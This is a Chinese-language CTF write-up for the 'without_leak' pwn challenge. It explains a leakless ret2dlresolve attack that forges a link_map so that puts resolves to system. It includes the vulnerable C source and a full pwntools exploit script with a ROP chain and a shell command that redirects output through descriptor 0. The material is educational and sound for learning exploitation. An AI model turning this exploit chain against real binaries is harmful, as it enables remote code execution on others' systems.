# without_leak

## 题目简述

程序在 32 字节栈缓冲区中读取 `0x200` 字节，未开启 PIE 和 Canary，但返回前关闭了文件描述符 1、2，无法按常规方式泄露 libc。利用思路是把伪造的 `link_map` 写入 `.bss`，再进入 PLT0 触发动态链接器，使原本针对 `puts` 的解析结果偏移到 `system`，完成不依赖地址泄露的 ret2dlresolve。

## 解题过程

主函数核心逻辑为：

```c
int main(void)
{
    char buf[32];

    puts("input> ");
    read(0, buf, 0x200);
    close(1);
    close(2);
    return 0;
}
```

NX 开启，固定地址可用，溢出偏移为 `0x28`。程序附带 `libc-2.27.so`，可预先计算：

$$
\Delta=\operatorname{addr}(system)-\operatorname{addr}(puts)
$$

伪造 `link_map` 时把 `l_addr` 设置为 $\Delta$，并令伪 `Elf64_Rela` 的 `r_offset` 抵消这一偏移。动态链接器按伪造的 `DT_STRTAB`、`DT_SYMTAB`、`DT_JMPREL` 查找重定位项后，会把本应解析到的 `puts` 加上 $\Delta$，最终跳到 `system`。

官方利用模板中构造伪结构的部分如下，改写为 Python 3 字节串后为：

```python
from pwn import *


def build_fake_link_map(map_addr, got_addr, reloc_index, offset):
    rel_addr = map_addr + 0x28

    fake_jmprel = p64(rel_addr - offset)  # r_offset
    fake_jmprel += p64(7)                 # r_info
    fake_jmprel += p64(0)                 # r_addend

    blob = p64(offset & ((1 << 64) - 1))  # l_addr
    blob = blob.ljust(0x30, b"\x00")
    blob += fake_jmprel

    blob = blob.ljust(0x68, b"\x00")
    blob += p64(map_addr)                 # fake DT_STRTAB
    blob += p64(map_addr + 0x70)          # fake DT_SYMTAB
    blob += p64(got_addr - 8)
    blob += p64(map_addr + 0x30 - 0x18 * reloc_index)

    blob = blob.ljust(0xF8, b"\x00")
    blob += p64(map_addr + 0x78)          # fake DT_JMPREL
    return blob
```

随后在 `.bss` 地址 `0x404090` 写入伪结构与命令，并调用 PLT0：

```python
context.arch = "amd64"

binary = ELF("./without_leak", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
io = process(binary.path)

plt0 = binary.get_section_by_name(".plt").header.sh_addr
pop_rdi = 0x401243
pop_rsi_r15 = 0x401241
ret = 0x40101A
fake_addr = 0x404090
reloc_index = 0  # puts 对应的槽

offset = libc.sym["system"] - libc.sym["puts"]
fake = build_fake_link_map(
    fake_addr,
    binary.got["puts"],
    reloc_index,
    offset,
)
command_addr = fake_addr + len(fake)
fake += b"exec /bin/sh 1>&0\x00"
fake = fake.ljust(0x200, b"\x00")

payload = b"A" * 0x28
payload += flat(
    pop_rdi, 0,
    pop_rsi_r15, fake_addr, 0,
    binary.plt["read"],
)
payload += flat(
    ret,
    pop_rdi, command_addr,
    plt0 + 6,
    fake_addr, reloc_index,
)
payload = payload.ljust(0x200, b"\x00")

io.sendafter(b"input> \n", payload)
io.send(fake)
io.interactive()
```

进入 `plt0 + 6` 后，栈上的 `fake_addr` 和 `reloc_index` 被当作解析器参数，等价于触发 `_dl_runtime_resolve(fake_link_map, 0)`。由于 stdout、stderr 已关闭，命令使用 `1>&0` 把标准输出重定向到仍连接 socket 的描述符 0，否则虽能启动 shell，却看不到结果。

关于延迟绑定中 PLT、GOT 和重定位表的通用布局，可参考 [CTF Wiki 的 ret2dlresolve 说明](https://ctf-wiki.org/pwn/linux/stackoverflow/advanced-rop/ret2dlresolve/)；本题所需的伪结构字段和调用链已在正文中展开。官方 PDF 未保留动态 flag。

## 方法总结

ret2dlresolve 的本质不是“神奇地调用未知函数”，而是伪造动态链接器将要读取的元数据，让它替攻击者完成符号解析。本题进一步利用已知 libc 中 `system-puts` 的相对偏移修改 `link_map.l_addr`。复现时必须匹配题目附带 libc、ELF 动态段布局和 PLT0 调用约定；输出描述符被关闭也是利用链的一部分，不能只做到控制 RIP。
